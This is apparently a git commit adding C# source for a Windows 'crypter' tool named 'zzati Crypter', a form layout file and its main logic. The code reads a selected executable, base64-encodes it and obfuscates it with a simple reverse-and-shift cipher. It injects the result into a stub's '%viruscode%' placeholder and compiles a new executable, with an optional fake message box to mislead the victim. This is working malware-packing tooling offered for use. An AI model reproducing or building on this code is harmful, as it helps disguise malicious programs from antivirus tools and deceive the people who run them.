20180a6d47a11b1edf7cf3d6b937f579720daa4c
zckxz <88599140+Zzatiz@users.noreply.github.com>
2024-01-31 21:44:49 -0600

    Add files via upload

---
+++ Form1.Designer.cs
@@ -0,0 +1,155 @@
+﻿namespace zzati_Crypter
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button1 = new System.Windows.Forms.Button();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button2 = new System.Windows.Forms.Button();
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.richTextBox2 = new System.Windows.Forms.RichTextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.richTextBox3 = new System.Windows.Forms.RichTextBox();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(339, 58);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(173, 33);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Select File";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(38, 65);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(295, 20);
+            this.textBox1.TabIndex = 1;
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(38, 91);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(295, 26);
+            this.button2.TabIndex = 2;
+            this.button2.Text = "Crypt";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Location = new System.Drawing.Point(38, 331);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.Size = new System.Drawing.Size(173, 113);
+            this.richTextBox1.TabIndex = 3;
+            this.richTextBox1.Text = "";
+            // 
+            // richTextBox2
+            // 
+            this.richTextBox2.Location = new System.Drawing.Point(339, 331);
+            this.richTextBox2.Name = "richTextBox2";
+            this.richTextBox2.Size = new System.Drawing.Size(173, 113);
+            this.richTextBox2.TabIndex = 4;
+            this.richTextBox2.Text = "";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(220, 383);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(112, 13);
+            this.label1.TabIndex = 5;
+            this.label1.Text = "Base64 Encrypted = >";
+            // 
+            // richTextBox3
+            // 
+            this.richTextBox3.Location = new System.Drawing.Point(38, 123);
+            this.richTextBox3.Name = "richTextBox3";
+            this.richTextBox3.Size = new System.Drawing.Size(474, 192);
+            this.richTextBox3.TabIndex = 6;
+            this.richTextBox3.Text = "";
+            // 
+            // checkBox1
+            // 
+            this.checkBox1.AutoSize = true;
+            this.checkBox1.Location = new System.Drawing.Point(38, 450);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(114, 17);
+            this.checkBox1.TabIndex = 7;
+            this.checkBox1.Text = "Fake MessageBox";
+            this.checkBox1.UseVisualStyleBackColor = true;
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(38, 473);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(313, 20);
+            this.textBox2.TabIndex = 8;
+            this.textBox2.Text = "Your Fake Message...";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(552, 540);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.checkBox1);
+            this.Controls.Add(this.richTextBox3);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.richTextBox2);
+            this.Controls.Add(this.richTextBox1);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.button1);
+            this.Name = "Form1";
+            this.Text = "zzati Crypter";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.RichTextBox richTextBox2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.RichTextBox richTextBox3;
+        private System.Windows.Forms.CheckBox checkBox1;
+        private System.Windows.Forms.TextBox textBox2;
+    }
+}
+
---
+++ Form1.cs
@@ -0,0 +1,166 @@
+﻿using Microsoft.VisualBasic;
+using Microsoft.VisualBasic.CompilerServices;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+
+namespace zzati_Crypter
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        //UNSAFE CODE
+
+
+       
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            using (var openFileDialog = new OpenFileDialog())
+            {
+
+
+                // SELECT OUR FILE :
+                openFileDialog.Filter = "exe (*.exe)|*.exe";
+                if (openFileDialog.ShowDialog() == DialogResult.OK)
+                {
+
+
+                    // DISPLAY OUR FILE ON TEXTBOX1, SO WE CAN READ OUR FILE LATER.
+
+                    textBox1.Text = openFileDialog.FileName;
+
+
+                    // READ AND CONVERT OUR FILE TO BASE64 STRING :
+
+                    string ey = Convert.ToBase64String(File.ReadAllBytes(textBox1.Text));
+
+                    // AND FINALLY DISPLAYING OUR BASE64 STRING INTO Richtextbox1, THEN Encrypting The Code Inside The RichTextBox1
+
+                    string iamrichtextbox1 = richTextBox1.Text = pr0t3_encrypt(ey);
+
+
+
+                    // AND DISPLAYING ENCRYPTED BASE64 CODE INTO RichTextBox2
+
+
+                    richTextBox2.Text = iamrichtextbox1;
+
+
+
+                }
+                else
+                {
+
+
+                }
+
+
+               
+            }
+
+
+        }
+
+
+        // OUR ENCRYPTION TO ENCRYPT BASE64 CODE :
+
+        public static string pr0t3_encrypt(string message)
+        {
+            int num = 3;
+            message = Strings.StrReverse(message);
+            string text = message;
+            int i = 0;
+            int length = text.Length;
+            checked
+            {
+                string text2 = "";
+                while (i < length)
+                {
+                    char @string = text[i];
+                    text2 += Conversions.ToString(Strings.Chr(Strings.Asc(@string) + num));
+                    i++;
+                }
+                return text2;
+            }
+        }
+
+
+
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+
+
+
+            // DECLARE OUR STUB FROM RESOURCES :
+            string ourstub = Properties.Resources.stub;
+
+            // DISPLAYING OUR STUB CODE INTO RICHTEXTBOX3 : 
+
+            richTextBox3.Text = ourstub;
+
+            // SEARCHING %Viruscode% inside the stub and replacing it with RichTextBox2.Text <= which contains encrypted Prot3 Code
+
+            richTextBox3.Text = richTextBox3.Text.Replace("%viruscode%", richTextBox2.Text);
+
+
+            // ENABLING FAKE MESSAGE FEATURE : 
+
+            if (checkBox1.Checked == true)
+            {
+
+
+                richTextBox3.Text = richTextBox3.Text.Replace("//ourfakemessage", "");
+                richTextBox3.Text = richTextBox3.Text.Replace("%fakemssage%", textBox2.Text);
+
+
+
+            }
+
+
+
+
+
+            // AND FINALLY WE USE SAVEFILEDIALOG/COMPILER TO SAVE OUR EXE
+
+            using (SaveFileDialog saveFile = new SaveFileDialog())
+            {
+                saveFile.Filter = "Executable (*.exe)|*.exe";
+                if (saveFile.ShowDialog() == DialogResult.OK)
+                {
+
+                    //CALLING CODEDOM TO BUILD OUR STUB :
+                    new laurentbd.bd(richTextBox3.Text, saveFile.FileName);
+
+                    // SHOWS MESSAGE AFTER COMPILE:
+                    MessageBox.Show("Your File Has Been Saved To" + saveFile.FileName, "Done!", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                }
+
+             
+
+            }
+
+
+
+        }
+    }
+}
+
+
